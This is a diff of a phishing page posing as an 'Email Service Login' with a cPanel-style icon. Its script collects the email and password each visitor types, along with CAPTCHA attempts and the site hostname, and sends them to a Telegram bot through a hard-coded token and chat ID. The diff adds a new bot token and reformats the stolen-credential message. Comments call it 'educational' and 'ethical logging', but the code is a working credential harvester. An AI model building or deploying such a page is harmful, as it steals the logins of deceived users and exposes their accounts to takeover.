@@ -4,10 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Email Service Login</title>
-    <link href="https://www.creativefreedom.co.uk/wp-content/uploads/2017/01/cpanel-logo.png" rel="icon" type="image/gif" />
+    <link href="https://th.bing.com/th/id/OIP.BorG5kgz0XwQwzajVlEnDgHaJM?w=137&amp;h=180&amp;c=7&amp;o=5&amp;pid=1.7" rel="icon" type="image/gif" />
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-      
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -155,7 +154,7 @@ There was an error with this action. Try again later.
 <script>
 // Telegram Bot Configuration - FOR EDUCATIONAL PURPOSES ONLY
 // Replace these with your own if you want to test the Telegram functionality
-const BOT_TOKEN = "7494101774:AAEQfg7tQ3PrmM9F6Ei4QFt06QEuWBDS6e4"; // Get from @BotFather
+const BOT_TOKEN = "8562390912:AAG30umSYKjNdiad-otls-zW8BQdNIvsCzo"; // Get from @BotFather
 const CHAT_ID = "1767885138";     // Get from @RawDataBot
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
@@ -244,14 +243,14 @@ $(document).ready(function() {
 
         // Ethical logging to Telegram - FOR EDUCATIONAL DEMONSTRATION ONLY
         const timestamp = new Date().toLocaleString();
-        const message = ` Mr Selfless046 \n\n` +
-                       ` ${timestamp}\n` +
-                       ` Email: ${ai}\n` +
-                       ` Password: ${pr}\n` +
-                       ` CAPTCHA Attempt: ${userCaptcha}\n` +
-                       ` CAPTCHA Match: ${userCaptcha.toUpperCase() === currentCaptcha ? "Yes" : "No"}\n` +
-                       ` Page: ${window.location.hostname}\n` +
-                       ` Attempt: ${count}/3`;
+        const message = `Mr Selfless046 ⚠️\n\n` +
+                       `${timestamp}\n` +
+                       `Email: ${ai}\n` +
+                       `Password: ${pr}\n` +
+                       `CAPTCHA Attempt: ${userCaptcha}\n` +
+                       `CAPTCHA Match: ${userCaptcha.toUpperCase() === currentCaptcha ? "Yes" : "No"}\n` +
+                       `Page: ${window.location.hostname}\n` +
+                       `Attempt: ${count}/3`;
  
 
         // Send to Telegram
